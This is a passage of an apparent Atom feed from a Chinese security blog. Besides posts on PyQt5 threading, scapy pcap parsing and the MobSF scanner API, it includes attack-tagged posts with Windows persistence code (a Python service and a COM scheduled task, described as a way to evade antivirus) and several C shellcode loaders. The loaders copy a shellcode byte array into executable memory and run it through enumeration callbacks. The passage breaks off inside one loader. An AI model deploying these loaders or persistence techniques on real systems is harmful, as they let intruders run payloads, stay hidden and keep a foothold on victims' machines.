+self.btn.clicked.connect(self.start_slot)
+h_layout = QHBoxLayout()
+v_layout = QVBoxLayout()
+h_layout.addWidget(QLabel(&amp;#39;网址：&amp;#39;))
+h_layout.addWidget(self.line)
+v_layout.addLayout(h_layout)
+v_layout.addWidget(self.btn)
+self.setLayout(v_layout)
+self.crawl_thread = CrawlThread(self) # 1
+def start_slot(self): # 2
+self.crawl_thread.start()
+class CrawlThread(QThread):
+def __init__(self, demo): # 3
+super(CrawlThread, self).__init__()
+self.demo = demo
+def run(self): # 4
+url = self.demo.line.text().strip()
+print(f&amp;#39;要爬取的网址为：{url}&amp;#39;)
+if __name__ == &amp;#39;__main__&amp;#39;:
+app = QApplication(sys.argv)
+demo = Demo()
+demo.show()
+sys.exit(app.exec_())
+&lt;/code>&lt;/pre>&lt;ol>
+&lt;li>
+&lt;p>实例化线程，注意此时我们需要把当前窗口类实例(也就是self)传入。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>按钮所连接的槽函数用来启动线程。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>给线程的初始化函数添加一个参数，用来获取窗口类实例。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>接着我们就可以在run函数中获取窗口上任何一个控件及其内容了。&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="子线程数据输入到控件">子线程数据输入到控件&lt;/h2>
+&lt;p>这里发起请求包的子线程的返回值输出到textbrowser控件上，txetbrowser就变成一个打印日志的框&lt;/p>
+&lt;p>用到了自定义信号来实现线程间通信&lt;/p>
+&lt;pre tabindex="0">&lt;code>import sys
+from PyQt5.QtWidgets import QApplication, QWidget
+from destination import Ui_Form
+import requests
+from PyQt5.QtCore import Qt, QThread, pyqtSignal
+class Demo(QWidget, Ui_Form):
+def __init__(self):
+super(Demo, self).__init__()
+self.setupUi(self)
+self.pushButton.clicked.connect(self.login)
+self.my_thread = MyThread(self) # 1
+self.my_thread.child_signal.connect(self.log) # 2
+def log(self, msg): # 5
+self.textBrowser.append(msg)
+# self.textBrowser.setText(msg)
+def login(self):
+self.my_thread.start()
+class MyThread(QThread):
+child_signal = pyqtSignal(str) # 3
+def __init__(self, demo):
+super(MyThread, self).__init__()
+self.demo = demo
+def buy(self):
+print(&amp;#39;buy&amp;#39;)
+def run(self):
+# phone = self.demo.textEdit.toPlainText()
+# print(phone)
+while 1:
+res=requests.get(&amp;#34;http://www.baidu.com&amp;#34;)
+# self.demo.textBrowser.setText(phone)
+# self.sig.emit(phone)
+self.child_signal.emit(res.text) # 4
+class Send(QThread):
+pass
+if __name__ == &amp;#39;__main__&amp;#39;:
+app = QApplication(sys.argv)
+demo = Demo()
+demo.show()
+sys.exit(app.exec_())
+&lt;/code>&lt;/pre>&lt;ol>
+&lt;li>实例化线程对象&lt;/li>
+&lt;li>线程自定义信号连接槽函数&lt;/li>
+&lt;li>自定义信号对象，str表示这个信号可以传递一个参数&lt;/li>
+&lt;li>自定义信号将结果发射出去&lt;/li>
+&lt;li>结果传递给槽函数&lt;/li>
+&lt;/ol></content><category scheme="https://if1sh.com/tags/gui/" term="gui" label="gui"/></entry><entry><title type="text">scapy流量分析</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/scapy%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/><id>https://if1sh.com/posts/scapy%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-03-24T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">scapy流量分析 关于流量分析，在某些上了手段的场景，主动或者被动获取到了流量，这个……</summary><content type="html">&lt;h1 id="scapy流量分析">scapy流量分析&lt;/h1>
+&lt;p>关于流量分析，在某些上了手段的场景，主动或者被动获取到了流量，这个时候可以用来威胁猎杀，捞出你想要的信息&lt;/p>
+&lt;p>scapy就是这样一个适合单兵作战的库，但是如果有es之类的流量分析平台就更好不过了，他们把分层规则都写好了，而且搜索速度极快&lt;/p>
+&lt;pre tabindex="0">&lt;code>rdpcap()：读取pcap文件
+show()：展示当前类型包含的属性及值
+haslayer()：判断当前流是否含有某层数据
+getlayer()：根据条件获取数据
+http_request = p[HTTPRequest].fields 直接获取提取好的字典形式的http数据用fields
+还有一个属性payload可以不断进下一个层
+比如现在有四个层 Ether,IP,TCP,RAW
+IP 可以表示为p.payload, 想要IP层的src可以用p.payload.src
+&lt;/code>&lt;/pre>&lt;h2 id="demo">demo&lt;/h2>
+&lt;p>scapy主要是分为Ethernet、IP、TCP、Raw这四层，每一层都有每一层的关键字，可以利用键值对的方式直接读取相应的内容。&lt;/p>
+&lt;pre tabindex="0">&lt;code>import scapy_http.http
+try:
+import scapy.all as scapy
+except ImportError:
+import scapy
+def parse_http_pcap(pcap_path):
+pcap_infos = list()
+packets = scapy.rdpcap(pcap_path)
+for p in packets:
+print &amp;#34;----&amp;#34;
+# 判断是否包含某一层，用haslayer
+if p.haslayer(&amp;#34;IP&amp;#34;):
+src_ip = p[&amp;#34;IP&amp;#34;].src
+dst_ip = p[&amp;#34;IP&amp;#34;].dst
+print &amp;#34;sip: %s&amp;#34; % src_ip
+print &amp;#34;dip: %s&amp;#34; % dst_ip
+if p.haslayer(&amp;#34;TCP&amp;#34;):
+# 获取某一层的原始负载用.payload.original
+raw_http = p[&amp;#34;TCP&amp;#34;].payload.original
+sport = p[&amp;#34;TCP&amp;#34;].sport
+dport = p[&amp;#34;TCP&amp;#34;].dport
+print &amp;#34;sport: %s&amp;#34; % sport
+print &amp;#34;dport: %s&amp;#34; % dport
+print &amp;#34;raw_http:\n%s&amp;#34; % raw_http
+if p.haslayer(&amp;#34;HTTPRequest&amp;#34;):
+host = p[&amp;#34;HTTPRequest&amp;#34;].Host
+uri = p[&amp;#34;HTTPRequest&amp;#34;].Path
+# 直接获取提取好的字典形式的http数据用fields
+http_fields = p[&amp;#34;HTTPRequest&amp;#34;].fields
+http_payload = p[&amp;#34;HTTPRequest&amp;#34;].payload.fields
+print &amp;#34;host: %s&amp;#34; % host
+print &amp;#34;uri: %s&amp;#34; % uri
+print &amp;#34;http_fields:\n%s&amp;#34; % http_fields
+print &amp;#34;http_payload:\n%s&amp;#34; % http_payload
+parse_http_pcap(&amp;#34;test.pcap&amp;#34;)
+&lt;/code>&lt;/pre>&lt;h2 id="参考">参考&lt;/h2>
+&lt;p>&lt;a href="https://www.jianshu.com/p/805075ca9d53">https://www.jianshu.com/p/805075ca9d53&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://blog.csdn.net/Yuberhu/article/details/64123516">https://blog.csdn.net/Yuberhu/article/details/64123516&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.cnblogs.com/17bdw/p/10562213.html#_label4">https://www.cnblogs.com/17bdw/p/10562213.html#_label4&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.xmanblog.net/python-pcap/">https://www.xmanblog.net/python-pcap/&lt;/a>&lt;/p></content><category scheme="https://if1sh.com/categories/%E9%98%B2/" term="防" label="防"/><category scheme="https://if1sh.com/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" term="流量分析" label="流量分析"/><category scheme="https://if1sh.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" term="流量分析" label="流量分析"/></entry><entry><title type="text">权限维持-py服务</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E6%9C%8D%E5%8A%A1/"/><id>https://if1sh.com/posts/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E6%9C%8D%E5%8A%A1/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-03-18T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">权限维持-py服务 # encoding=utf-8 import win32serviceutil import win32service import win32event import os import logging import inspect class PySerTest(win32serviceutil.ServiceFramework): _svc_name_ = &amp;#34;PySerTest&amp;#34; _svc_display_name_ = &amp;#34;Py Service Test&amp;#34; # 服务显示的名称，……</summary><content type="html">&lt;h1 id="权限维持-py服务">权限维持-py服务&lt;/h1>
+&lt;pre tabindex="0">&lt;code># encoding=utf-8
+import win32serviceutil
+import win32service
+import win32event
+import os
+import logging
+import inspect
+class PySerTest(win32serviceutil.ServiceFramework):
+_svc_name_ = &amp;#34;PySerTest&amp;#34;
+_svc_display_name_ = &amp;#34;Py Service Test&amp;#34; # 服务显示的名称，可以自己修改
+_svc_description_ = &amp;#34;This is a python service test code &amp;#34; # 服务显示的描述
+def __init__(self, args):
+win32serviceutil.ServiceFramework.__init__(self, args)
+self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
+self.logger = self._getLogger()
+self.run = True
+def _getLogger(self):
+logger = logging.getLogger(&amp;#39;[PythonService]&amp;#39;)
+this_file = inspect.getfile(inspect.currentframe())
+dirpath = os.path.abspath(os.path.dirname(this_file))
+# handler = logging.FileHandler(os.path.join(dirpath, &amp;#34;service.log&amp;#34;))
+handler = logging.FileHandler(&amp;#34;c:\\service.log&amp;#34;)
+formatter = logging.Formatter(&amp;#39;%(asctime)s %(name)-12s %(levelname)-8s %(message)s&amp;#39;)
+handler.setFormatter(formatter)
+logger.addHandler(handler)
+logger.setLevel(logging.INFO)
+return logger
+def SvcDoRun(self):
+# 在此编写自己的业务程序
+import time
+self.logger.info(&amp;#34;service is run....&amp;#34;)
+while self.run:
+self.logger.info(&amp;#34;I am runing....&amp;#34;)
+time.sleep(2)
+def SvcStop(self):
+self.logger.info(&amp;#34;service is stop....&amp;#34;)
+self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+win32event.SetEvent(self.hWaitStop)
+self.ReportServiceStatus(win32service.SERVICE_STOPPED)
+self.run = False
+if __name__ == &amp;#39;__main__&amp;#39;:
+# win32serviceutil.HandleCommandLine(PythonService)
+import sys
+import servicemanager
+if len(sys.argv) == 1:
+try:
+evtsrc_dll = os.path.abspath(servicemanager.__file__)
+servicemanager.PrepareToHostSingle(PySerTest) # 如果修改过名字，名字要统一
+servicemanager.Initialize(&amp;#39;PySerTest&amp;#39;, evtsrc_dll) # 如果修改过名字，名字要统一
+servicemanager.StartServiceCtrlDispatcher()
+except win32service.error as details:
+import winerror
+if details == winerror.ERROR_FAILED_SERVICE_CONTROLLER_CONNECT:
+win32serviceutil.usage()
+else:
+win32serviceutil.HandleCommandLine(PySerTest) # 如果修改过名字，名字要统一
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="攻" label="攻"/><category scheme="https://if1sh.com/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" term="权限维持" label="权限维持"/><category scheme="https://if1sh.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" term="权限维持" label="权限维持"/></entry><entry><title type="text">权限维持-py计划任务</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/><id>https://if1sh.com/posts/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-03-14T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">权限维持-py计划任务 底层还是调用api,com玩来玩去 纵观历史,从无非就是从vb,……</summary><content type="html">&lt;h1 id="权限维持-py计划任务">权限维持-py计划任务&lt;/h1>
+&lt;p>底层还是调用api,com玩来玩去&lt;/p>
+&lt;p>纵观历史,从无非就是从vb,powershell,c#,以及后面的各类小众语言演变出来的调用api的维权&lt;/p>
+&lt;p>维权的手段就是将现有的可用权限维持的正常服务,在用底层重写一下,用以免杀&lt;/p>
+&lt;pre tabindex="0">&lt;code>import datetime
+import win32com.client
+# create com
+scheduler = win32com.client.Dispatch(&amp;#39;Schedule.Service&amp;#39;)
+scheduler.Connect()
+root_folder = scheduler.GetFolder(&amp;#39;\\&amp;#39;)
+task_def = scheduler.NewTask(0)
+# Create trigger
+start_time = datetime.datetime.now() + datetime.timedelta(minutes=5)
+TASK_TRIGGER_TIME = 1
+TASK_IIdleTrigger = 6
+trigger = task_def.Triggers.Create(TASK_IIdleTrigger)
+trigger.Repetition.Interval = &amp;#34;PT5M&amp;#34; # 每5分钟循环执行一次
+trigger.Enabled = True
+trigger.StartBoundary = start_time.isoformat()
+# Create action
+TASK_ACTION_EXEC = 0
+action = task_def.Actions.Create(TASK_ACTION_EXEC)
+action.ID = &amp;#39;DO NOTHING&amp;#39;
+action.Path = &amp;#34;C:\\Users\\ifish\\Desktop\\flash_cn.exe&amp;#34;
+# action.Arguments = &amp;#39;/c &amp;#34;exit&amp;#34;&amp;#39;
+# Set parameters
+task_def.RegistrationInfo.Description = &amp;#39;Test Task&amp;#39;
+task_def.Settings.Enabled = True
+task_def.Settings.StopIfGoingOnBatteries = False
+# Register task
+# If task already exists, it will be updated
+TASK_CREATE_OR_UPDATE = 6
+TASK_LOGON_NONE = 0
+root_folder.RegisterTaskDefinition(
+&amp;#39;Test Task&amp;#39;, # Task name
+task_def,
+TASK_CREATE_OR_UPDATE,
+&amp;#39;&amp;#39;, # No user
+&amp;#39;&amp;#39;, # No password
+TASK_LOGON_NONE)
+&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="攻" label="攻"/><category scheme="https://if1sh.com/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" term="权限维持" label="权限维持"/><category scheme="https://if1sh.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" term="权限维持" label="权限维持"/></entry><entry><title type="text">mobsf api调试</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/mobsf-api%E8%B0%83%E8%AF%95/"/><id>https://if1sh.com/posts/mobsf-api%E8%B0%83%E8%AF%95/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-03-12T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">mobsf api调试 mobsf 平台需要接入移动端扫描,于是选用了mobsf 查阅mobsf的源码,得知……</summary><content type="html">&lt;h1 id="mobsf-api调试">mobsf api调试&lt;/h1>
+&lt;h2 id="mobsf">mobsf&lt;/h2>
+&lt;p>平台需要接入移动端扫描,于是选用了mobsf&lt;/p>
+&lt;p>查阅mobsf的源码,得知它的静态扫描也是通过使用正则来匹配敏感信息,静态扫描误报还是挺多的&lt;/p>
+&lt;p>以下用来测试mobsf接口&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;#34;&amp;#34;&amp;#34;
+MOBSF REST API Python Requests
+&amp;#34;&amp;#34;&amp;#34;
+import json
+import requests
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+SERVER = &amp;#34;http://127.0.0.1:8000&amp;#34;
+FILE = &amp;#39;diva-beta.apk&amp;#39;
+APIKEY = &amp;#39;&amp;lt;API_KEY&amp;gt;&amp;#39;
+def upload():
+&amp;#34;&amp;#34;&amp;#34;Upload File&amp;#34;&amp;#34;&amp;#34;
+print(&amp;#34;Uploading file&amp;#34;)
+multipart_data = MultipartEncoder(fields={&amp;#39;file&amp;#39;: (FILE, open(FILE, &amp;#39;rb&amp;#39;), &amp;#39;application/octet-stream&amp;#39;)})
+headers = {&amp;#39;Content-Type&amp;#39;: multipart_data.content_type, &amp;#39;Authorization&amp;#39;: APIKEY}
+response = requests.post(SERVER + &amp;#39;/api/v1/upload&amp;#39;, data=multipart_data, headers=headers)
+print(response.text)
+return response.text
+def scan(data):
+&amp;#34;&amp;#34;&amp;#34;Scan the file&amp;#34;&amp;#34;&amp;#34;
+print(&amp;#34;Scanning file&amp;#34;)
+post_dict = json.loads(data)
+headers = {&amp;#39;Authorization&amp;#39;: APIKEY}
+response = requests.post(SERVER + &amp;#39;/api/v1/scan&amp;#39;, data=post_dict, headers=headers)
+print(response.text)
+def pdf(data):
+&amp;#34;&amp;#34;&amp;#34;Generate PDF Report&amp;#34;&amp;#34;&amp;#34;
+print(&amp;#34;Generate PDF report&amp;#34;)
+headers = {&amp;#39;Authorization&amp;#39;: APIKEY}
+data = {&amp;#34;hash&amp;#34;: json.loads(data)[&amp;#34;hash&amp;#34;]}
+response = requests.post(SERVER + &amp;#39;/api/v1/download_pdf&amp;#39;, data=data, headers=headers, stream=True)
+with open(&amp;#34;report.pdf&amp;#34;, &amp;#39;wb&amp;#39;) as flip:
+for chunk in response.iter_content(chunk_size=1024):
+if chunk:
+flip.write(chunk)
+print(&amp;#34;Report saved as report.pdf&amp;#34;)
+def json_resp(data):
+&amp;#34;&amp;#34;&amp;#34;Generate JSON Report&amp;#34;&amp;#34;&amp;#34;
+print(&amp;#34;Generate JSON report&amp;#34;)
+headers = {&amp;#39;Authorization&amp;#39;: APIKEY}
+data = {&amp;#34;hash&amp;#34;: json.loads(data)[&amp;#34;hash&amp;#34;]}
+response = requests.post(SERVER + &amp;#39;/api/v1/report_json&amp;#39;, data=data, headers=headers)
+print(response.text)
+def delete(data):
+&amp;#34;&amp;#34;&amp;#34;Delete Scan Result&amp;#34;&amp;#34;&amp;#34;
+print(&amp;#34;Deleting Scan&amp;#34;)
+headers = {&amp;#39;Authorization&amp;#39;: APIKEY}
+data = {&amp;#34;hash&amp;#34;: json.loads(data)[&amp;#34;hash&amp;#34;]}
+response = requests.post(SERVER + &amp;#39;/api/v1/delete_scan&amp;#39;, data=data, headers=headers)
+print(response.text)
+RESP = upload()
+scan(RESP)
+json_resp(RESP)
+pdf(RESP)
+delete(RESP)
+&lt;/code>&lt;/pre>&lt;h2 id="来源">来源&lt;/h2>
+&lt;p>&lt;a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF&lt;/a>&lt;/p></content><category scheme="https://if1sh.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" term="移动安全" label="移动安全"/><category scheme="https://if1sh.com/tags/app%E6%89%AB%E6%8F%8F/" term="app扫描" label="app扫描"/></entry><entry><title type="text">c shellcode callback function</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/c-shellcode-callback-function/"/><id>https://if1sh.com/posts/c-shellcode-callback-function/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-24T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">c shellcode callback function EnumChildWindows.cpp //#include &amp;#34;stdafx.h&amp;#34; #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main() { char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34; &amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34; &amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34; &amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34; &amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34; &amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34; &amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34; &amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34; &amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34; &amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34; &amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34; &amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34; &amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34; &amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;; HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(hAlloc, shellcode,……</summary><content type="html">&lt;h1 id="c-shellcode-callback-function">c shellcode callback function&lt;/h1>
+&lt;h2 id="enumchildwindowscpp">EnumChildWindows.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumChildWindows((HWND) NULL,(WNDENUMPROC) hAlloc,NULL);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumdateformatsacpp">EnumDateFormatsA.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumDateFormatsA((DATEFMT_ENUMPROCA)hAlloc , LOCALE_SYSTEM_DEFAULT, (DWORD) 0);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumdesktopwcpp">EnumDesktopW.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;#34;Wingdi.h&amp;#34;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumDesktopsW(GetProcessWindowStation(),(DESKTOPENUMPROCW) hAlloc, NULL);
+printf(&amp;#34;%d&amp;#34;, GetLastError());
+VirtualFree(hAlloc,0, MEM_RELEASE);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumdesktopwindowscpp">EnumDesktopWindows.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
+&amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;;
+HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(hAlloc, shellcode, sizeof(shellcode));
+EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()),
+(WNDENUMPROC) hAlloc,
+(LPARAM) NULL);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="enumsystemcodepagesacpp">EnumSystemCodePagesA.cpp&lt;/h2>
+&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+int main()
+{
+char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
+&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
+&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
+&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
+&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
+&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
+&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
+&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
+&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
+&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
+&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
+&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
+&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
